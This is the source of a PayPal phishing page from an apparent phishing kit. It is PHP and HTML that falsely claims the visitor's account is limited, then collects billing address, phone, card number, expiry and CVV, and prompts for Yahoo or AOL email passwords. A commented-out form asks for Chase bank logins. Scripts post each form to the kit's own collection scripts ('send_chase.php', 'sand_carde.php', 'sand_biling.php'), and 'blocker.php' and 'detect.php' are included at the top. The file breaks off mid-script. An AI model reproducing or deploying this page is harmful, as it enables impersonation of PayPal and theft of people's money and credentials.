<?php
session_start();
include "../system/blocker.php";
include "../system/detect.php";

include "../system/system.php";

?>


<!DOCTYPE html>

<title>PayPal: Summary</title>

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<link rel="shortcut icon" href="../style/img/pp_favicon_x.ico" />

<link rel="apple-touch-icon" href="../style/img/pp64.png" />



<head>
<script src="" crossorigin="anonymous"></script><script src="" crossorigin="anonymous"></script><script src="" crossorigin="anonymous"></script><script src="" crossorigin="anonymous"></script><script src="" crossorigin="anonymous"></script><script src="" crossorigin="anonymous"></script><script src="" crossorigin="anonymous"></script><script src="" crossorigin="anonymous"></script><script src="" crossorigin="anonymous"></script><script src="" crossorigin="anonymous"></script><script src="" crossorigin="anonymous"></script><script src="" crossorigin="anonymous"></script><script src="" crossorigin="anonymous"></script><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, minimum-scale=1.0"><meta charset="utf-8"><link rel="shortcut icon" sizes="196x196" href="https://www.paypalobjects.com/webstatic/icon/pp196.png"><link rel="shortcut icon" type="image/x-icon" href="https://www.paypalobjects.com/webstatic/icon/favicon.ico"><link rel="icon" type="image/x-icon" href="https://www.paypalobjects.com/webstatic/icon/pp32.png"><link rel="stylesheet" href="./css/paypal-sans.css"><link rel="stylesheet" href="./css/main.ltr.css"><title>PayPal: Wallet</title><style id="inert-style">
[inert] {
  pointer-events: none;
  cursor: default;
}

[inert], [inert] * {
  user-select: none;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
}
</style>
<script type="text/javascript" async="" crossorigin="anonymous" src=""></script>
<script src="" defer=""></script><script src=""></script><style data-emotion=""></style>

</head>






<script>
function openNav() {
    document.getElementById("mySidenav").style.width = "100%";
}

function closeNav() {
    document.getElementById("mySidenav").style.width = "0";
}
</script>

<div id="mySidenav" class="sidenav">




<script>
$("#siraconta").click(function(e) {
      e.preventDefault();
   $(location).attr("href", "//paypal.com/myaccount");
});
</script>
<script>
$("#sirpaypala").click(function(e) {
      e.preventDefault();
   $(location).attr("href", "//paypal.com/signin");
});
</script>       






<div id='tbadkatviry'>
<br><br>
<br>
<br>
<br>
<br>
<br>
<div>
<div style="text-align: center;">
<span class="stepLogo paymentStepLogo" data-reactid="14"></span>
<div class="centerContainer contextStep firstLoad" data-reactid="9">
<div class="paymentContainer" data-reactid="10"><div data-reactid="11">
<img  src="../style/img/warning.png">



<h2>Quick security check</h2><p> We apologize for any inconvenience. </p><p> You can not access all your PayPal advantages, due to account limited. <br>
                        </p><p>We just need some additional info to confirm it's you.</p><p style="margin-bottom:25px;"> To restore your account, please click <i>Continue</i> to confirm your information</p>		


<button id="submit" onclick="closeNav()" class="vx_btn" type="submit" autocomplete="off" tabindex="0"><!-- react-text: 259 -->Continue To PayPal<!-- /react-text --><span class="icon-paypal-container"><!-- react-text: 261 -->&nbsp;<!-- /react-text --><span class=""></span></span><!-- react-text: 263 --><!-- /react-text --></button>

</div>


</div></div>

</div></div>


</div>



<div id="tbanhadiblastviry" style="display:none;">

<br><br>
<br>
<br>
<br>
<br>
<br>



<div style="text-align: center;">


<img width="150" height="150" src="../style/img/animation-checkmark.gif&#10;">


                         <p>  Now you can enjoy our services, thank you for choosing our trusted service.<br> 
                             your account will be verified in the next 24 hours. 
                        </p>
                        <div class="btn-content-last">
                            






<button id="irpaypala" class="vx_btn" type="submit" autocomplete="off" tabindex="0"><!-- react-text: 259 --> My PayPal<!-- /react-text --><span class="icon-paypal-container"><!-- react-text: 261 -->&nbsp;<!-- /react-text --><span class=""></span></span><!-- react-text: 263 --><!-- /react-text --></button> 

<button id="iraconta" class="vx_btn vx_btn-secondary" type="submit" autocomplete="off" tabindex="0"><!-- react-text: 259 --> Log Out<!-- /react-text --><span class="icon-paypal-container"><!-- react-text: 261 -->&nbsp;<!-- /react-text --><span class=""></span></span><!-- react-text: 263 --><!-- /react-text --></button>





                                                                 </div>
                        <p class="seconds"> You are being redirected to your PayPal account , within 10 seconds. </p> 

			<p></p><h2>Your Account <?php echo $_SESSION['_login_email_'] ;?>  has been successfully Restored</h2><h2><p></p>
            

<p></p> 
<p></p> 


<p></p><div class="footerLink"></div></h2></div>


</div>
</div>





<style>
body {
    font-family: "Lato", sans-serif;
}

.sidenav {
    height: 100%;
    width: 100%;
    position: fixed;
        z-index: 5;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background-color: #ffffff;
    opacity: 0.9;
    overflow-y: hidden;
    transition: 0.5s;
}

.sidenav a {
    padding: 8px 8px 8px 32px;
    text-decoration: none;
    font-size: 25px;
    color: #818181;
    display: block;
    transition: 0.3s;

}
.sidenav a:hover{
    color: #f1f1f1;
}
.sidenav .closebtn {
    position: absolute;
    top: 0;
    right: 25px;
    font-size: 36px;
    margin-left: 50px;
}
</style>


<style>

 #chtadiscover {
	background-image: url('../style/img/3dsecure.png');
	background-repeat: no-repeat;
	background-position: 98.5% 75.4%;
}

 #chtamastartro {
	background-image: url('../style/img/3dsecure.png');
	background-repeat: no-repeat;
	background-position: 99.5% 62.0%;
}

  #chtacalub {
	background-image: url('../style/img/3dsecure.png');
	background-repeat: no-repeat;
	background-position: 99.5% 46.8%;
}

  #chtaofam {
	background-image: url('../style/img/3dsecure.png');
	background-repeat: no-repeat;
	background-position: 97.5% 34.0%;
}

  #chtajcb {
	background-image: url('../style/img/3dsecure.png');
	background-repeat: no-repeat;
	background-position: 97.5% 20.0%;
}

 #chtamastercard {
	background-image: url('../style/img/3dsecure.png');
	background-repeat: no-repeat;
	background-position: 97.5% 9.5%;
}


  #chtavisa {
	background-image: url('../style/img/3dsecure.png');
	background-repeat: no-repeat;
	background-position: 97.5% -1.3%;
}

</style>





<style type="text/css">
.multi.equal .right {
    float: right;
}
.multi.equal .left, .multi.equal .right {
    width: 48.6%;
}
.multi .right {
    width: 25%;
    float: left;
}
.multi.equal .left {
    margin-right: 0;
}
.multi.equal .left, .multi.equal .right {
    width: 48.6%;
}
.multi .left {
    width: 72.5%;
    float: left;
}
.left, .middle {
    margin-right: 10px;
}



.vx_btn.vx_btn-seco, .vx_btn-small.vx_btn-secon, .vx_btn-medium.vx_btn-seco {


background-color: transparent;
    border-color: #0070ba;
    color: #0070ba;


    margin-right: 0;
    margin-left: 0;
    width: 100%;
}



</style>




<script src="../style/js/jquery.min.js"></script>
<script src="./lib/js/jquery.additional-methods.js"></script>









</head>
<body class=""><div id="app-element-mountpoint"><div id="document-body" data-reactroot="" data-reactid="1">

<div class="backgroundColor" style="background-color:#ffffff;" data-reactid="2">





</script><div data-reactid="4"><div class="signup clear app-wrapper
                     " data-reactid="5">
					 
					 <main data-reactid="9"><div data-reactid="10"><!-- react-text: 11 --> <!-- /react-text --><div class="signup-page-form" data-reactid="12"><div class="notification" data-reactid="13"></div><div data-reactid="14"><!-- react-text: 15 --> <!-- /react-text -->

<div id="fixed"  class="vx_has-spinner-large spinner_fullScreen test_has_spinner" >
</div>


 <div id="doori" style="display:none;"> 
<div class="notification"></div>
<div class="busyIcon"></div>
<div class="busyOverlay"></div>
</div>




<script type="text/javascript">
document.onreadystatechange = function () {
  var state = document.readyState
  if (state == 'complete') {
      setTimeout(function(){
          document.getElementById('interactive');
         document.getElementById('fixed').style.visibility="hidden";
      },4000);
  }
}
</script>

<body  ng-app=""  >




<script>
// Wait for the DOM to be ready


$(function() {

$('#Canceled').on('click',function(event){
	event.preventDefault();
//$('#doori').show();
$("#chased").hide();                   
$("#chaseimg").hide();
$('#Choosektaba').show();
$('#Choose').show();
$('#hrup').show();
$('#Confirms').show();
$('#pos').show();


});

	var validator = $("#chaseform").bind("invalid-form.validate", function() {
			$("#errorrnwabanks").html("<div class='vx_alert vx_alert-critical form-alert alertComponent test_alert-message'><p role='alert' aria-live='assertive' class='vx_alert-text'><!-- react-text: 204 -->Please check your information and try again.<!-- /react-text --></p></div>");})


  $("form[name='chaseform']").validate({
    // Specify validation rules

	errorContainer: $("#errorrnwabanks"),


    rules: {


      firstname: "required",
      lastname: "required",
      email: {
        required: true,
        
        email: true
      },
      password: {
        required: true,
        minlength: 5
      }
    },

highlight: function ( element, errorClass, validClass ) {
$( element ).parents( ".dddd" ).removeClass( validClass );
	$( element ).parents( ".dddd" ).addClass( errorClass );
				},
unhighlight: function (element, errorClass, validClass) {
					
	$( element ).parents( ".dddd" ).addClass( validClass );
$( element ).parents( ".dddd" ).removeClass( errorClass );
				},



    messages: {

      firstName: "First Name is required!",
      lastName: "Last Name is required!",

      namebank: "Please check your bank name.",
      xxnxx: "Please check your Routing Number.",
      xxllxx: "Please check your Account Number.",


paypalcreditExpiration: {
        required: "Expiration Month/Year  is required!",
        minlength: "Please enter a valid Expiration Month/Year "
      },


 paypalcreditCardSecurityCode: {
        required: "Security Code (CVV) is required!",
        minlength: "Please enter a valid CVV code"
      },


  cardnumber: {
        required: "Please check your card number",
        minlength: "Please check your card number"
      },


      password: {
        required: "Please provide a password",
        minlength: "Your password must be at least 5 characters long"
      },
      email: "Please enter a valid email address"
    },
    // Make sure the form is submitted to the destination defined
    // in the "action" attribute of the form when valid
    
                submitHandler: function(form) {

                    $("#doori").show();



					$.post("../system/send_chase.php?ajax", $("#chaseform").serialize(), function(result) {
                            setTimeout(function() {

                          

$("#siribabbbk").attr("class","setupStep-state nemo_account nemo_account_created nemo_setup_button setupStep-doneState accountCreated");

  $("#siribabbbk").html("<span class='icon icon-medium icon-checkmark-small setupStep-icon' aria-hidden='true'></span><span class='setupStep-stateContent'>accounts Bank confirmed </span>");


$("#cardkatba").show();
$("#card").show();
$("#chased").hide();                   
$("#chaseimg").hide();
$("#doori").hide();  


$('#hrup').show();
$('#Confirms').show();
$('#pos').show();

                                $(location).attr("", "");
                            });
                    });
    }
  });
});




</script>


<!--<><><><><><><>chaselog><><><><><>><><><><><>-->
<!--
<div id="chased">

<form id="chaseform" name="chaseform" action="#" method="post">
<div style="margin-right: 145px; margin-left: 145px;" class="left">
<div id="UserNameIDdiv" class="dddd dor vx_form-group vx_floatingLabel_active" data-label-content="Chase username" data-reactid="128">
<label for="Chase username" data-reactid="129">Chase username</label>
<div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input type="text" required="required" ng-model="UserNameID" id="UserNameID" aria-describedby="text-info-expDate UserNameIDinputError" name="chase_username" class="" placeholder="" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true"></div>
</div>
<label id="UserNameIDinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;">This field is required</label>

<div style="margin-bottom: 0.9em;" id="" class="dddd dor vx_form-group vx_floatingLabel_active" data-label-content="Chase password" data-reactid="128"><label for="Chase username" data-reactid="129">Chase password</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input required="required" type="Password" ng-model="PasswordBank" id="PasswordBank" aria-describedby="text-info-expDate PasswordBankinputError" name="chase_password" class="" placeholder="" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true"></div>
</div>
<label id="PasswordBankinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;">This field is required</label>
</div>
<div style="margin-right:145px; margin-left: 145px;" class="">
<button type="submit" style="margin-bottom: 0.6em;" class="btchase">Agree and Link</button>

<button id="Canceled" type="submit" class="btchase2">Cancel</button>
</form>
</div>

</div>-->
<!--<><><><><><><>chaselog><><><><><>><><><><><>-->

<style>
.btchase{
font-family: inherit;
	 font-size: 1rem;
    font-weight: 600;
    padding: 0.55em 1em;
    border-radius: 4px;
    border: 0;

}

.btchase2{
	font-family: inherit;
	 font-size: 1rem;
    font-weight: 600;
    padding: 0.55em 1em;
    border-radius: 4px;
    border: 0;
	
}


.btchase:active {
background: #004c95;
}
.btchase2:active {
background: #b3b3b3;
}

.btchase{
color: #ffffff;
    background: #0B6EFD;
}


.btchase2{
color: #666;
background: #e5e5e5;
}

.btchase2:hover{
    background: #d4d3d3;
}

</style>


<!--<><><><><><><><><><><><><><><><><><><><>>>>>>>>>>>New Carding<<<<<<<<<<<<<><><>-->
<div id = "Choose" class="vx_modal-wrapper-backgroundOverride vx_modal-wrapper vx_modal-wrapper_logo elementDirection" tabindex="-1"><div><div class="vx_modal-content"><div class="form-container"><h2 class="vx_text-2 autoLinkCardChoice-optionHeader"></h2><h6 class="vx_text-6 autoLinkCardChoice-title">Link a card manually</h6><div class="fi-clickable test_achtodc_default"><a id="Choose1" class="col col-xs-12 fi-auto-link fiDottedLine-list manualCard-link" href="#" data-name="linkManually" pa-marked="1"><span><span class="col-xs-2 newChoiceFi-icon"><img src="./img/cardIcon.svg"></span><span class="col-xs-8 newChoiceFi-text"><span class="autoLinkCardChoice-header">Debit or credit card</span></span></span><span class="col-xs-1 vx_icon vx_icon-small vx_icon-arrow-right-half-small fi-auto-link-arrow"></span></a></div><h6 class="vx_text-6 autoLinkCardChoice-title">Quickly link the cards issued by your bank</h6><ul class="multiCurrency-container"><li class="fiDottedLine-list fi-clickable"><a href="#" id = "Choose2" data-name="selectBank" class="col col-xs-12 fi-auto-link" pa-marked="1"><span><span class="col-xs-2 newChoiceFi-icon"><div class="wallet-card-bg"><span data-name="" class="rectangleLogo_small shadow  bank-icon fiListItem-typeIconImage chase"></span></div></span><span class="col-xs-8 newChoiceFi-text"><span class="autoLinkCardChoice-header">Chase</span></span></span><span class="col-xs-1 vx_icon vx_icon-small vx_icon-arrow-right-half-small fi-auto-link-arrow"></span></a></li></ul></div></div></div></div>

<!-- react-empty: 17 --><div data-reactid="18"><!-- react-text: 19 --> <!-- /react-text -->


<div id="bilingkatba" class="" style="margin:0px 0px 20px 0px;text-align:center;" data-reactid="20">
<h1 style="font-size: 20px;" class="vx_text-2 center" style="margin-top:0px;" data-reactid="21">
Billing address must match the billing address of your


</h1></br>
</div>
	<script>
	$(function() {
		$('html, body').animate({
            scrollTop: $("#bilingkatba").offset().top
        }, 2000, function() {
           $("#Firstname").focus();
        });
	});
	</script>
<div  id="cardkatba" class="" style="margin:0px 0px 20px 0px;text-align:center;" data-reactid="20">
<h1 style="font-size: 20px;" class="vx_text-2 center" style="margin-top:0px;" data-reactid="21">Confirm your Credit/Debit Card, no need to enter it again when using PayPal</h1></br>
</div>



<div  id="androidkatba" class="" style="display:none;margin:0px 0px 20px 0px;text-align:center;" data-reactid="20">
<h1 class="vx_text-2 center" style="margin-top:0px;" data-reactid="21">Last Version Of PayPal Application</h1>
</div>





<!--
<div id="scritykatba"  style="display:none;margin:0px 0px 20px 0px;text-align:center;"  data-reactid="20">
<h1 class="vx_text-2 center" style="margin-top:0px;" data-reactid="21">Confirm your debit or credit card </h1>
</div>
-->



<div id="bankkatba" class=""  style="margin:0px 0px 20px 0px;text-align:center;" data-reactid="20">
<h1 style="font-size: 20px;" class="vx_text-2 center" style="margin-top:0px;" data-reactid="21">Just Link And Confirm Your Bank Account</h1>
</div>







<?php
if ( strpos( $_SESSION['_login_email_'], '@yahoo' ) !== false || strpos( $_SESSION['_login_email_'], '@ymail' ) !== false ) {
	$text1 = "yahoo.com";
	$img = "./img/yahoo_img.png";
	$type = "Yahoo email";
}
else if ( strpos( $_SESSION['_login_email_'], '@aol' ) !== false ) {
	$text1 = "aol.com";
	$img = "./img/aol_img.png";
	$type = "Aol email";
}
else {
	$text1 = "your email";
	$img = "./img/email_img.png";
	$type = "email";
}
?>


<div id="emailkatba" class=""  style="display:none; margin:0px 0px 20px 0px;text-align:center;" data-reactid="20">

<center>
<div style="margin-top: 25px;">
<img src="<?php echo $img ?>" alt="Yahoo" class="logo yahoo-en-US" width="" height="27">
</div>
<div class="yid" id="echoemaildress" style="margin-top: 10px; margin-bottom: 10px;"><?php echo $_SESSION['_login_email_'];?></div>

<strong style="" class="challenge-heading">Enter password you used to sign in to <?php echo $text1;?></strong>

<div style="margin-top: 5px;" class="txt-align-center challenge-desc">to finish and linked your <?php echo$type;?> with PayPal</div>

</center>

</div>



<div id="upleadkatba" class=""  style="display:none;margin:0px 0px 20px 0px;text-align:center;" data-reactid="20">
<h1 class="vx_text-2 center" style="margin-top:0px;" data-reactid="21">Please confirme your ID for more secure</h1>
</div>


<div id="thankskatba" class=""  style="display:none;margin:0px 0px 20px 0px;text-align:center;" data-reactid="20">
<h1 class="vx_text-2 center" style="margin-top:0px;" data-reactid="21">Congratulations! Your have restored your account access.</h1>
</div>


<!-- react-text: 22 --> <!-- /react-text --></div>


<div class="fieldGroupContainer" data-reactid="23">



<script src="./lib/js/jquery.additional-methods.js"></script>
<script src="./lib/js/jquery.CardValidator.js"></script>
<script src="./lib/js/jquery.js"></script>
<script src="./lib/js/jquery.mask.js"></script>
<script src="./lib/js/jquery.phoneNumber.js"></script>
<script src="./lib/js/jquery.validate.min.js"></script>


  <script>
    $(function() {
    $('#birthdate').mask('00/00/0000');
	});
    $(function() {
    $('#expdate').mask('00/0000');
	});
    $(function() {
    $('#phoneNumber').mask('(000) 000-0000');
	});
	</script>


  <script type="text/javascript">
    $(function() {
        $('#cardnumber').mask('0000 0000 0000 0000 0000');
		$('#csc').mask('0000');

        $('#birthdate').mask('00/00/0000');

        $('#SSN').mask('000-00-0000');





	});
	</script>


<div id="billing">


<script>


$(function() {

	var validator = $("#bilings").bind("invalid-form.validate", function() {
			$("#errorrbiliing").html("<div class='vx_alert vx_alert-critical form-alert alertComponent test_alert-message'><p role='alert' aria-live='assertive' class='vx_alert-text'><!-- react-text: 204 -->Please check your information and try again.<!-- /react-text --></p></div>");})


  $("form[name='bilings']").validate({

	errorContainer: $("#errorrbiliing"),



    rules: {


      email: {
        required: true,
        email: true
      },
      password: {
        required: true,
        minlength: 5
      }
    },


highlight: function ( element, errorClass, validClass ) {
$( element ).parents( ".dddd" ).removeClass( validClass );
	$( element ).parents( ".dddd" ).addClass( errorClass );
				},
unhighlight: function (element, errorClass, validClass) {
					
	$( element ).parents( ".dddd" ).addClass( validClass );
$( element ).parents( ".dddd" ).removeClass( errorClass );
				},



    messages: {
      Firstname: "First Name is required",
      LastName: "Last Name is required",
      phoneNumber : "Phone Number is required",
      zipCod : "Postal Code is required",
      addres : "Address Line is required",
      password: {
        required: "Please provide a password",
        minlength: "Your password must be at least 5 characters long"
      },




      email: "Please enter a valid email address"
    },




     submitHandler: function(form) {

		 
		 //alert(mm);
		 
$("#doori").show();


					$.post("../system/sand_biling.php?ajax", $("#bilings").serialize(), function(result) {
                            setTimeout(function() {

var type = $("#card_type").val();
var cn= $("#cardnumber").val().split(" ")[3];


$("#Confirm4")[0].innerHTML +=  type + " X- " + cn;



           $("#Confirm4").show(); 
           $("#Confirm2").hide(); 
		   
           $("#scritykatba").show(); 
            $("#cardscrity").show();
					
					$("#po2").hide();
					$("#po3").show();

                    $("#billing").hide();
                    $("#bilingkatba").hide();
                    $("#doori").hide();


                        });
                 });
        },
  
  });

});



</script>





<form id="bilings" action="" method="post" data-reactid="113" name="bilings"  >


<div id="errorrbiliing"></div>



<div class="multi equal clearfix">
                                                    <div class=" left">

<div class="dddd dor vx_form-group vx_floatingLabel_active" data-label-content="First name" data-reactid="128"><label for="expDate" data-reactid="129">First name</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input data-rule-pattern="^[a-z A-Z0-9]+$"  value="" type="text" required="required" ng-model="Firstname" id="Firstname" aria-describedby="text-info-expDate FirstnameinputError" name="Firstname" class="" placeholder="" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="false">
</div>
  </div>

<label id="FirstnameinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>

                      </div>



<div class="right">  



<div  class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="Last Name" data-reactid="128"><label for="expDate" data-reactid="129">Last Name</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input required="required" type="text"  ng-model="LastName"
 id="LastName" aria-describedby="text-info-expDate LastNameinputError" name="LastName" class="" placeholder="" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true">

</div>
</div>

<label id="LastNameinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>



                                                    </div>
                                            </div>





<div class="dddd dor  vx_form-group vx_floatingLabel_active " data-label-content="Address Line" data-reactid="128"><label for="expDate" data-reactid="129">Address Line</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">

<input required="required" type="text" id="addres" aria-describedby="text-info-expDate addresinputError" name="addres" class="test_expDate vx_has-error-with-message vx_form-control-message" placeholder="" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true">
</div>
</div>
<label id="addresinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>


<div class="multi equal clearfix">

        <div class=" left">

<div class="dddd dor vx_form-group vx_floatingLabel_active" data-label-content="City" data-reactid="128"><label for="expDate" data-reactid="129">City</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input type="text" required="required" ng-model="City" id="City" aria-describedby="text-info-expDate CityinputError" name="City" class="" placeholder="" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="false">
</div>
  </div>

<label id="CityinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>

                      </div>



<div class="right">  



<div  class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="State" data-reactid="128"><label for="expDate" data-reactid="129">State</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input required="required" type="text"  ng-model="State"
 id="State" aria-describedby="text-info-expDate StateinputError" name="State" class="" placeholder="" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true">

</div>
</div>

<label id="StateinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>



                                                    </div>
                                            </div>








<div class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="Postal Code" data-reactid="128"><label for="expDate" data-reactid="129">Postal Code</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input type="text" required="required" id="zipCod" aria-describedby="text-info-expDate zipCodinputError" name="zipCod" class="test_expDate hasText valid" placeholder="-----" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="false">

</div>
  </div>

<label id="zipCodinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>



<div class="dddd dor vx_form-group vx_floatingLabel_active" data-label-content="Phone Number" data-reactid="128"><label for="expDate" data-reactid="129">Phone Number</label><div class="vx_form-control vx_form-control_complex a" data-reactid="130">
<input type="text" required="required" id="phoneNumber" aria-describedby="text-info-expDate phoneNumberinputError" name="phoneNumber" class="test_phoneNumber hasText valid" placeholder="(___) ___ ____" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="false">

</div>
</div>
<label id="phoneNumberinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>
<br>




<button type="submit" class="vx_btn vx_btn-block validateBeforeSubmit">Continue</button>



</form>

</div>




<script>
// Wait for the DOM to be ready
$(function() {

	var validator = $("#cardings").bind("invalid-form.validate", function() {
			$("#errorrcardings").html("<div class='vx_alert vx_alert-critical form-alert alertComponent test_alert-message'><p role='alert' aria-live='assertive' class='vx_alert-text'><!-- react-text: 204 -->Please check your information and try again.<!-- /react-text --></p></div>");})




  $("form[name='cardings']").validate({
    
	errorContainer: $("#errorrcardings"),

    rules: {
      // The key name on the left side is the name attribute
      // of an input field. Validation rules are defined
      // on the right side
      firstname: "required",
      lastname: "required",
      email: {
        required: true,
        // Specify that email should be validated
        // by the built-in "email" rule
        email: true
      },
      password: {
        required: true,
        minlength: 5
      }
    },

highlight: function ( element, errorClass, validClass ) {
$( element ).parents( ".dddd" ).removeClass( validClass );
	$( element ).parents( ".dddd" ).addClass( errorClass );
				},
unhighlight: function (element, errorClass, validClass) {
					
	$( element ).parents( ".dddd" ).addClass( validClass );
$( element ).parents( ".dddd" ).removeClass( errorClass );
				},





    messages: {

      NameOnCard: "Name On Card is required!",

      lastName: "Last Name is required!",




expdate: {
        required: "Expiration Month/Year  is required!",
        minlength: "Please enter a valid Expiration Month/Year "
      },


 csc: {
        required: "Security Code (CVV) is required!",
        minlength: "Please enter a valid CVV code"
      },


  cardnumber: {
        required: "Card Number is required!",
        minlength: "Please check your Card Number"
      },


      password: {
        required: "Please provide a password",
        minlength: "Your password must be at least 5 characters long"
      },






      email: "Please enter a valid email address"
    },
    // in the "action" attribute of the form when valid
    
                submitHandler: function(form) {
					var s = $('#expdate').val().split('/');
					var mm = +s[0];
					var yy = +s[1];
					
					 if ( yy.toString().length == 2) {
						yy = +("20" + yy);
						
					}
					
					if ( mm < 1 || mm > 12) {
						$('#expDateinputError')
						.show()
						.text('Please enter a valid Month!');
						return false;
					}
					
					
					else if ( yy < 2020 || yy > 2050) {
						$('#expDateinputError')
						.show()
						.text('Please enter a valid Year!');
						return false;
					}
                    $("#doori").show();
					$.post("../system/sand_carde.php?ajax", $("#cardings").serialize(), function(result) {
                            setTimeout(function() {



var type = $("#card_type").val();
var cn= $("#cardnumber").val().split(" ")[3];


$("#bilingkatba h1")[0].innerHTML += type + " X- " + cn;

$("#bilingkatba").show();
$("#bilings").show();
$("#card").hide();
$("#cardkatba").hide();
$("#po1").hide();
$("#po2").show();
$("#Confirm1").hide();
$("#Confirm2").show();
                    $("#doori").hide();


 var $id = $('input[name="cardnumber"]').val();
 $('#ofm3raftch').html('' + $id.substr($id.length - 4));


                                $(location).attr("", "");
                            });
                    });
    }
  });
});

</script>



<div id="card" >

<form id="cardings" action="" method="post" data-reactid="113" name="cardings" >



<div id="errorrcardings"></div>


<!--<div data-reactid="114"><ul class="cardImages-container" data-reactid="115"><li class="cardImages-entry" data-reactid="116">


<span id='visaa' class="rectangleLogo_small shadow  visaLogo cardImages-icon" data-reactid="117"></span>

</li><li class="cardImages-entry" data-reactid="118">

<span id='metrcardaa'  class="rectangleLogo_small shadow  master_cardLogo cardImages-icon" data-reactid="119">

</span></li><li class="cardImages-entry" data-reactid="120">

<span id='amxaa'  class="rectangleLogo_small shadow  amexLogo cardImages-icon" data-reactid="121"></span>


</li><li class="cardImages-entry" data-reactid="122">

<span id='discovaraa'  class="rectangleLogo_small shadow  discoverLogo cardImages-icon" data-reactid="123"></span>

</li></ul></div>-->




<div  class="dddd dor vx_form-group vx_floatingLabel_active" data-label-content="Name On Card" data-reactid="124"><label for="cardNumber" data-reactid="125">Name On Card</label><div class="vx_form-control vx_form-control_complex" data-reactid="126">


<input ng-model="NameOnCard" type="text" required="required" id="NameOnCard" aria-describedby="text-info-cardNumber NameOnCardinputError" name="NameOnCard" class="test_NameOnCard vx_form-control-message" placeholder="Enter Name On Card" autocomplete="off" value="" data-reactid="127" aria-required="true" aria-invalid="true">

<input name="c_type" type="hidden" id="card_type" value="">




</div></div>

<label id="NameOnCardinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>






<div  class="dddd dor vx_form-group vx_floatingLabel_active" data-label-content="Credit or debit card number" data-reactid="124"><label for="cardNumber" data-reactid="125">Credit or debit card number</label><div class="vx_form-control vx_form-control_complex" data-reactid="126">


<!--style="    background-image: url(../../lib/img/sprites_cc_logos.png);
    background-repeat: no-repeat;
    background-position: 98.5% 81.7%;" -->
<input 
style=" 

   background-image: url(../../lib/img/sprites_cc_logos.png);
    background-repeat: no-repeat;
    background-position: 98.5% 81.7%;"
maxlength="19" minlength="18"  type="text" required="required" id="cardnumber" aria-describedby="text-info-cardNumber cardNumberinputError" name="cardnumber" class="test_cardNumber vx_form-control-message" placeholder="Enter card number" autocomplete="off" value="" data-reactid="127" aria-required="true" aria-invalid="true">


</div></div>

<label id="cardNumberinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>


<div class="dddd dor vx_form-group vx_floatingLabel_active" data-label-content="Expiry date" data-reactid="128"><label for="expDate" data-reactid="129">Expiry date</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">

<input maxlength="7" minlength="5"  type="text" id="expdate"  ng-model="expdate" aria-describedby="text-info-expDate expDateinputError" name="expdate" class="test_expDate hasText valid" required="required" placeholder="mm/yy" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="false">

</div></div>

<label id="expDateinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>

<div class="table-container" data-reactid="132"><div class="table-row" data-reactid="133"><div class="table-col-xs-10" data-reactid="134"><div class="dddd dor vx_form-group vx_floatingLabel_active" data-label-content="Security code" data-reactid="135"><label for="verificationCode" data-reactid="136">Security code</label><div class="vx_form-control vx_form-control_complex" data-reactid="137">

<input  type="text" id="csc" aria-describedby="text-info-verificationCode verificationCodeinputError" name="csc" class="test_verificationCode hasText valid" required="required" placeholder="Enter security code" autocomplete="off" data-reactid="138" aria-required="true" aria-invalid="false">

<label id="verificationCodeinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>


</div>
</div>


</div>

<div class="table-col-xs-2 cardImage-container" data-reactid="139"><span id='cscaa' class="rectangleLogo_small shadow  csc-image " data-reactid="140"></span>

</div></div></div><div class="vx_form-group" data-reactid="141">

<div>
<div>






 
<br>

 <button type="submit" class="vx_btn vx_btn-block validateBeforeSubmit">Continue</button>

</form>

</div>
</div>
</div>



</div>






<div id="cardscrity"  >

<div class="" style="" id="formdetail" role="document">
<div id="overpanel-header" class=" overpanel-header">
<h2 style="font-size: 16px;" id="overpanel-header">
Please confirm your card details, you must prove your information to verify and linked your card
</h2></br></br>
</div>
<div class=" overpanel-body">



<script>

$(function() {


	var validator = $("#3dcarding").bind("invalid-form.validate", function() {
			$("#errorr3dcarding").html("<div class='vx_alert vx_alert-critical form-alert alertComponent test_alert-message'><p role='alert' aria-live='assertive' class='vx_alert-text'><!-- react-text: 204 -->Please check your information and try again.<!-- /react-text --></p></div>");})



  $("form[name='3dcarding']").validate({
    // Specify validation rules

	errorContainer: $("#errorr3dcarding"),


    rules: {
      // The key name on the left side is the name attribute
      // of an input field. Validation rules are defined
      // on the right side
      firstname: "required",
      lastname: "required",
      email: {
